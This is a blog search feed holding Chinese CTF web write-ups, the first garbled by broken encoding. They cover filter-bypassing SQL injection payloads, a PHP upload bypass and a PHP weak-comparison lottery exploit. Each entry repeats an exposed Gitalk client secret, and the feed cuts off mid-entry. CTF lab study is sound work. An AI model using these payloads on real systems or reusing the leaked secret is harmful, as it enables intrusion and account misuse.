<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[CTF��������-WEB-upload]]></title>
      <url>/2019/12/29/ctf-web-upload/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01 ǰҪ</p></div>
1.SQLע��


<a id="more"></a>
<br>
<div class="note info"><p>0x02 ����������˼·</p></div>
1.ע���˺ţ���½���������ϴ��ļ�����Ż���С���ļ��ϴ���shell��һ�׵ĸо���
 1_1.ֱ���ϴ�php��txt�ļ����ᱨ����������һ�µģ���������Burp Suite��Intruder���ܲ��ԣ����ϴ��ļ����ͣ��������jpg��
![](1.PNG)

<p>2.ͨ��Burp Suite�޸ĺ�׺���ɹ��ϴ��ļ����֣�����û�����ò˵���ѯ���ݿ⡣<br> 2_2.����ÿ���ϴ��ɹ�����ҳ���л���ʾ�ϴ����ļ�����Ҳ����˵���ļ�ȷʵ���ϴ��������ݿ��С�</p>
<p><img src="2.PNG" alt=""></p>
<p>3.����SQLע�룬select database().jpg,ҳ����ʾ���ļ���Ϊdatabase().jpg����ζ��select�������������ˡ�<br> 3_1.������ע�벻�У�����˫д���߱պ�ע�롣���Է��ֵ�ע��selselectect���Գɹ��ƹ�ע�롣</p>
<p><img src="3.PNG" alt=""></p>
<p> 3_2.�²����ݿ�����﷨Ϊ<br>    INSERT INTO table_name (‘filename’,’…..’)<br>    VALUES (‘upload_filename’);</p>
<p> 3_3.�޸�ע��,�ϴ��ɹ�����ҳ�淵�ص��ļ���Ϊ0��SQL���ȷʵ���ϴ��ˣ�����ȴ�޷�������<br> <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect database())+'</span>.jpg</span><br></pre></td></tr></table></figure></div><br> 3_4.����wp֮�󣬳��Խ������Ϊ16���ơ�ҳ�淵��ֵΪ 7765625��ʵ������д��python hexת��Ļᷢ�ַ���ֵΪ7λ������ֱ�ӱ������²��Ƿ���һ������ֵ���������ض��ˡ�ʵ���������ɲµ��˽ضϣ����������ż���Է���ֵ���ڵ�����£����Կ��ο���Ĳ�������ô�Ʋ�ġ�</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect hex(database()))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<p> 3_5.������������,CONV(N,ԭ����,Ŀ�����)<br>    (1)����ʮ���ƣ�ҳ�淵��ֵΪ1.8446744073709552e19������ֵ����<br> ‘+(selselectect conv(hex(database()),16,10))+’.jpg<br> <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(2)��substr���������ơ�substr(str,pos,len)  str�ַ�������pos��ʼ��λ�ã���ȡlen���ַ�(�հ�Ҳ���ַ�)��</span><br><span class="line">�ö��ַ����Է���ֵ�������ޣ����ֵ�����Ϊ12ʱ������ֵΪ�����������ȳ���12ʱ�򣬷���ֵ����Ϊ�ݼ�</span><br><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+ &#39;.jpg</span><br></pre></td></tr></table></figure></div><br>  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect conv(substr(hex(database()),13,12),16,10))+ '</span>.jpg</span><br></pre></td></tr></table></figure></div><br>    (3)������ֵ��ת��Ϊ16���ƣ��ٽ���hexת�룬�ֱ�ó���� web_up��load���ó����ݿ���Ϊ web_upload</p>
<br>

<p> 3_6.�����²����<br>    (1)���б���ע��</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='</span>web_upload<span class="string">' limit 1,1)),1,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='</span>web_upload<span class="string">' limit 1,1)),13,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='</span>web_upload<span class="string">' limit 1,1)),25,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='</span>web_upload<span class="string">' limit 1,1)),37,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>

<pre><code>(2)ƴ�ӵó����� hello_flag_is_here</code></pre><br>

<p>3_7.������ѯ����<br>    (1)���б�ע��</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect CONV(substr(hex((selecselectt group_concat(column_name) frofromm information_schema.columns where table_name='</span>hello_flag_is_here<span class="string">')),1,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect CONV(substr(hex((selecselectt group_concat(column_name) frofromm information_schema.columns where table_name='</span>hello_flag_is_here<span class="string">')),13,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<pre><code>(2)תΪʮ�����ƺ�hex���� ƴ�ӵó���� i_am_flag</code></pre><p>3_8.������ѯ�ֶ�<br>    (1)�ֶ�ע��</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<pre><code>(2)ƴ�ӵó����  !!_@m_Th.e_F!lag</code></pre><p>4.�������˵�ǳ��ӣ�����Ҫ��XCTF��flag֮���ǰ׺���ó��ľ��ǽ�����</p>
<div class="note info"><p>0x03 �ο�</p></div>
1.<a href="https://www.runoob.com/sql/sql-insert.html" target="_blank">1.SQL���������������https://www.runoob.com/sql/sql-insert.html</a><br>
2.<a href="https://www.lagou.com/lgeduarticle/38458.html" target="_blank">ctf-web���ף�https://www.lagou.com/lgeduarticle/38458.html</a><br>








<br>
<br>

<!-- Link Gitalk ��֧���ļ�  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk����Ҫ����
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;ҳ���Ψһ��ʶ��gitalk����������ʶ�Զ�������issue�ı�ǩ&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      
        <categories>
            
            <category> CTF-WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQLע�� </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF攻防世界-WEB-bug]]></title>
      <url>/2019/12/28/ctf-web-bug/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01 前要</p></div>
1.文件上传绕过<br>
2.apache的文件解析漏洞

<a id="more"></a>
<br>
<div class="note info"><p>0x02 解题流程与思路</p></div>
1.看到登陆界面，尝试sql注入，无果。

<br>

<p>2.按流程注册账号，登陆，登陆成功，但显示只有admin用户才允许使用特权</p>
<p><img src="1.PNG" alt=""></p>
<p>3.已知用户为admin，考虑到是不是要用字典爆破密码。但是看到wp里，可以通过修改密码时，通过修改传参，修改admin的密码。</p>
<p><img src="2.PNG" alt=""></p>
<p>4.显示IP not allowed发现仍然登陆失败，抓包查看请求IP。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">请求网址:http://111.198.29.45:34163/index.php?module=admin</span><br><span class="line">请求方法:GET</span><br><span class="line">远程地址:127.0.0.1:8080</span><br></pre></td></tr></table></figure></div>
<p>4_1.修改IP 为127.0.0.1，成功登陆，并找到线索</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- index.php?module=filemanage&amp;<span class="keyword">do</span>=???--&gt;</span><br></pre></td></tr></table></figure></div>
<p>5.根据线索，已知是文件管理模型，猜测do为增删查改，尝试write，download,read,upload。最后确认为upload。</p>
<p><img src="3.PNG" alt=""></p>
<p>6.尝试上传文件，提示只能上传图片文件，最初猜测是一句话木马，后来发现更简单粗暴。。。<br>新建txt文件 写入下面代码，然后改后缀名为image文件，然后上传文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">'php'</span>&gt;随便写不影响解题&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
<p>6_1.依旧抓包，改参数，将后缀名改为php5，即可获得flag<br><img src="4.PNG" alt=""></p>
<div class="note info"><p>0x03 参考</p></div>
1.<a href="https://blog.csdn.net/harry_c/article/details/100631696" target="_blank">l攻防世界WEB进阶之bug</a><br>
2.<a href="https://blog.csdn.net/wn314/article/details/77074477" target="_blank">关于为什么最后一步无法使用php.xxx只能改参php4/5</a><br>








<br>
<br>

<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      
        <categories>
            
            <category> CTF-WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 修改传参 </tag>
            
            <tag> 文件上传绕过 </tag>
            
            <tag> 伪造ip </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF攻防世界-WEB-lottery]]></title>
      <url>/2019/12/27/ctf-lottery/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01 前要</p></div>
1.目录遍历-git源码泄露<br>
2.robots协议<br>
3.PHP 弱类型比较

<a id="more"></a>


<div class="note info"><p>0x02 解题流程与思路</p></div>
1.尝试测试网页，注册账号，购买彩票，攒足足够的钱，购买flag。<br>
1_1.尝试购买彩票，利用浏览器工具抓包，发现购买彩票时，数据通过api.php。

<p><img src="1.PNG" alt=""></p>
<p>2.尝试获取api.php源码，在CTF新手区时，其实我们做过类似的题目，robots协议，尝试查看robots.txt。可知网页存在.git源码泄露。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /.git/</span><br></pre></td></tr></table></figure></div>
<br>

<p>3.下载githack，遍历网页目录并下载<br>3_1.<a href="https://github.com/tigert1998/GitHack-py3" target="_blank">下载github-python3</a></p>
<p><img src="2.PNG" alt=""></p>
<p>4.文件存在我们需要的api.php，查看api.php代码，进行代码审计。</p>
<details>
<summary>api.php代码     展开/折叠</summary>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once(&#39;config.php&#39;);</span><br><span class="line">header(&#39;Content-Type: application&#x2F;json&#39;);</span><br><span class="line"></span><br><span class="line">function response($resp)&#123;</span><br><span class="line">	die(json_encode($resp));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function response_error($msg)&#123;</span><br><span class="line">	$result &#x3D; [&#39;status&#39;&#x3D;&gt;&#39;error&#39;];</span><br><span class="line">	$result[&#39;msg&#39;] &#x3D; $msg;</span><br><span class="line">	response($result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function require_keys($req, $keys)&#123;</span><br><span class="line">	foreach ($keys as $key) &#123;</span><br><span class="line">		if(!array_key_exists($key, $req))&#123;</span><br><span class="line">			response_error(&#39;invalid request&#39;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function require_registered()&#123;</span><br><span class="line">	if(!isset($_SESSION[&#39;name&#39;]) || !isset($_SESSION[&#39;money&#39;]))&#123;</span><br><span class="line">		response_error(&#39;register first&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function require_min_money($min_money)&#123;</span><br><span class="line">	if(!isset($_SESSION[&#39;money&#39;]))&#123;</span><br><span class="line">		response_error(&#39;register first&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">	$money &#x3D; $_SESSION[&#39;money&#39;];</span><br><span class="line">	if($money &lt; 0)&#123;</span><br><span class="line">		$_SESSION &#x3D; array();</span><br><span class="line">		session_destroy();</span><br><span class="line">		response_error(&#39;invalid negative money&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">	if($money &lt; $min_money)&#123;</span><br><span class="line">		response_error(&#39;you don\&#39; have enough money&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SERVER[&quot;REQUEST_METHOD&quot;] !&#x3D; &#39;POST&#39; || !isset($_SERVER[&quot;CONTENT_TYPE&quot;]) || $_SERVER[&quot;CONTENT_TYPE&quot;] !&#x3D; &#39;application&#x2F;json&#39;)&#123;</span><br><span class="line">	response_error(&#39;please post json data&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data &#x3D; json_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;), true);</span><br><span class="line">if(json_last_error() !&#x3D; JSON_ERROR_NONE)&#123;</span><br><span class="line">	response_error(&#39;invalid json&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">require_keys($data, [&#39;action&#39;]);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; my boss told me to use cryptographically secure algorithm </span><br><span class="line">function random_num()&#123;</span><br><span class="line">	do &#123;</span><br><span class="line">		$byte &#x3D; openssl_random_pseudo_bytes(10, $cstrong);</span><br><span class="line">		$num &#x3D; ord($byte);</span><br><span class="line">	&#125; while ($num &gt;&#x3D; 250);</span><br><span class="line"></span><br><span class="line">	if(!$cstrong)&#123;</span><br><span class="line">		response_error(&#39;server need be checked, tell admin&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$num &#x2F;&#x3D; 25;</span><br><span class="line">	return strval(floor($num));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function random_win_nums()&#123;</span><br><span class="line">	$result &#x3D; &#39;&#39;;</span><br><span class="line">	for($i&#x3D;0; $i&lt;7; $i++)&#123;</span><br><span class="line">		$result .&#x3D; random_num();</span><br><span class="line">	&#125;</span><br><span class="line">	return $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function buy($req)&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(2);</span><br><span class="line"></span><br><span class="line">	$money &#x3D; $_SESSION[&#39;money&#39;];</span><br><span class="line">	$numbers &#x3D; $req[&#39;numbers&#39;];</span><br><span class="line">	$win_numbers &#x3D; random_win_nums();</span><br><span class="line">	$same_count &#x3D; 0;</span><br><span class="line">	for($i&#x3D;0; $i&lt;7; $i++)&#123;</span><br><span class="line">		if($numbers[$i] &#x3D;&#x3D; $win_numbers[$i])&#123;</span><br><span class="line">			$same_count++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	switch ($same_count) &#123;</span><br><span class="line">		case 2:</span><br><span class="line">			$prize &#x3D; 5;</span><br><span class="line">			break;</span><br><span class="line">		case 3:</span><br><span class="line">			$prize &#x3D; 20;</span><br><span class="line">			break;</span><br><span class="line">		case 4:</span><br><span class="line">			$prize &#x3D; 300;</span><br><span class="line">			break;</span><br><span class="line">		case 5:</span><br><span class="line">			$prize &#x3D; 1800;</span><br><span class="line">			break;</span><br><span class="line">		case 6:</span><br><span class="line">			$prize &#x3D; 200000;</span><br><span class="line">			break;</span><br><span class="line">		case 7:</span><br><span class="line">			$prize &#x3D; 5000000;</span><br><span class="line">			break;</span><br><span class="line">		default:</span><br><span class="line">			$prize &#x3D; 0;</span><br><span class="line">			break;</span><br><span class="line">	&#125;</span><br><span class="line">	$money +&#x3D; $prize - 2;</span><br><span class="line">	$_SESSION[&#39;money&#39;] &#x3D; $money;</span><br><span class="line">	response([&#39;status&#39;&#x3D;&gt;&#39;ok&#39;,&#39;numbers&#39;&#x3D;&gt;$numbers, &#39;win_numbers&#39;&#x3D;&gt;$win_numbers, &#39;money&#39;&#x3D;&gt;$money, &#39;prize&#39;&#x3D;&gt;$prize]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function flag($req)&#123;</span><br><span class="line">	global $flag;</span><br><span class="line">	global $flag_price;</span><br><span class="line"></span><br><span class="line">	require_registered();</span><br><span class="line">	$money &#x3D; $_SESSION[&#39;money&#39;];</span><br><span class="line">	if($money &lt; $flag_price)&#123;</span><br><span class="line">		response_error(&#39;you don\&#39; have enough money&#39;);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$money -&#x3D; $flag_price;</span><br><span class="line">		$_SESSION[&#39;money&#39;] &#x3D; $money;</span><br><span class="line">		$msg &#x3D; &#39;Here is your flag: &#39; . $flag;</span><br><span class="line">		response([&#39;status&#39;&#x3D;&gt;&#39;ok&#39;,&#39;msg&#39;&#x3D;&gt;$msg, &#39;money&#39;&#x3D;&gt;$money]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function register($req)&#123;</span><br><span class="line">	$name &#x3D; $req[&#39;name&#39;];</span><br><span class="line">	$_SESSION[&#39;name&#39;] &#x3D; $name;</span><br><span class="line">	$_SESSION[&#39;money&#39;] &#x3D; 20;</span><br><span class="line"></span><br><span class="line">	response([&#39;status&#39;&#x3D;&gt;&#39;ok&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">switch ($data[&#39;action&#39;]) &#123;</span><br><span class="line">	case &#39;buy&#39;:</span><br><span class="line">		require_keys($data, [&#39;numbers&#39;]);</span><br><span class="line">		buy($data);</span><br><span class="line">		break;</span><br><span class="line"></span><br><span class="line">	case &#39;flag&#39;:</span><br><span class="line">		flag($data);</span><br><span class="line">		break;</span><br><span class="line"></span><br><span class="line">	case &#39;register&#39;:</span><br><span class="line">		require_keys($data, [&#39;name&#39;]);</span><br><span class="line">		register($data);</span><br><span class="line">		break;</span><br><span class="line">	</span><br><span class="line">	default:</span><br><span class="line">		response_error(&#39;invalid request&#39;);</span><br><span class="line">		break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

</details>

<br>

<p>（1）requests是json格式<br>（2）玩家输入的彩票数字与系统随机生成的数字对比为==弱比较<br>（3）并且比较为一位一位的比较</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0; <span class="variable">$i</span>&lt;7; <span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">		<span class="variable">$same_count</span>++;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>



<br>

<p>5.已知为php弱比较型，利用Burp Suite传包，进行数字比较时，使得任何数字都与系统生成数字相等，即ture。<br>post数据是action，调用buy函数。以及我们输入的数字number。不停的传包，使得我们获得足够的钱，购买flag。</p>
<br>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"action"</span>:<span class="string">"buy"</span>,<span class="string">"numbers"</span>:[<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>]&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="3.PNG" alt=""></p>
<div class="note info"><p>0x04 参考</p></div>
1.<a href="https://www.jianshu.com/p/911ec94e8259" target="_blank">lottery!（about /.git）</a><br>

<br>
<br>

<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      
        <categories>
            
            <category> CTF-WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 目录遍历 </tag>
            
            <tag> git源码泄露 </tag>
            
            <tag> robots协议的利用 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP 弱类型比较 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF攻防世界-WEB-cis05]]></title>
      <url>/2019/12/24/ctf-ics-05/</url>
